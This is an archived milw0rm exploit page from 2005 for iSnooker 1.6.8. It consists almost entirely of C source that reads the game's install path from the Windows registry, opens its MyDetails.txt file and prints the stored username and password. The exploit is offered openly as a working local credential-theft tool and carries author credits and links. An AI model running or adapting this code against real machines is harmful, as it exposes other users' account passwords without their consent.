<html><head><title>iSnooker <= 1.6.8 Local Password Disclosure Exploit</title></head><pre>/*****************************************************************

iSnooker &lt;= v1.6.8 Local Password Disclosure Exploit by Kozan

Application: iSnooker 1.6.8

Vendor:
Memir Software - memirsoftware.com and
The Snooker Club - thesnookerclub.com

Vulnerable Description:
iSnooker 1.6.8 discloses passwords to local users.

Discovered &amp; Coded by Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;

HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main()
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,

&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;,
                                       0,
                                       KEY_QUERY_VALUE,
                                       &amp;hKey) == ERROR_SUCCESS)
       {

           lRet = RegQueryValueEx( hKey, &quot;ProgramFilesDir&quot;, NULL, NULL,
              (LPBYTE) prgfiles, &amp;dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen &gt; BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf(&quot;An error occured. Can't get password!\n&quot;);
                                return -1;
                       }

                       RegCloseKey(hKey);

   }
       else
       {
               printf(&quot;An error occured. Can't get password!\n&quot;);
               return -1;
       }

       printf(&quot;\n\niSnooker 1.6.8 Local Password Disclosure Exploit by Kozan\n&quot;);
       printf(&quot;Credits to ATmaCA\n&quot;);
       printf(&quot;kozan@netmagister.com\n&quot;);
       printf(&quot;www.netmagister.com - www.spyinstructors.com\n\n&quot;);

       char pwdfile[BUFSIZE], username[BUFSIZE], password[BUFSIZE];

strcpy(pwdfile,strcat(prgfiles,&quot;\\TheSnookerClub\\iSnooker\\MyDetails.txt&quot;));

       int addr, i, y;
       FILE *fp;
       char ch[100], ch2[100];

       if((fp=fopen(pwdfile,&quot;rb&quot;)) == NULL)
       {
               printf(&quot;An error occured. Can't get password!\n&quot;);
               return -1;
       }

       fseek(fp,0,0);

       for(i=0;i&lt;30;i++)
       {
               ch[i]=getc(fp);
               if(ch[i]==0x0D)
               {
                       ch[i]=NULL;
                       strcpy(username,ch);
                       break;
               }
       }

       addr = ftell(fp);
       fseek(fp,addr+1,0);

       for(y=0;y&lt;30;y++)
       {
               ch2[y]=getc(fp);
               if(ch2[y]==0x0D)
               {
                       ch2[y]=NULL;
                       strcpy(password,ch2);
                       break;
               }
       }

       fclose(fp);

       printf(&quot;Username        : %s\n&quot;,username);
       printf(&quot;Password        : %s\n&quot;,password);

       return 0;
}

// milw0rm.com [2005-03-16]</pre></html>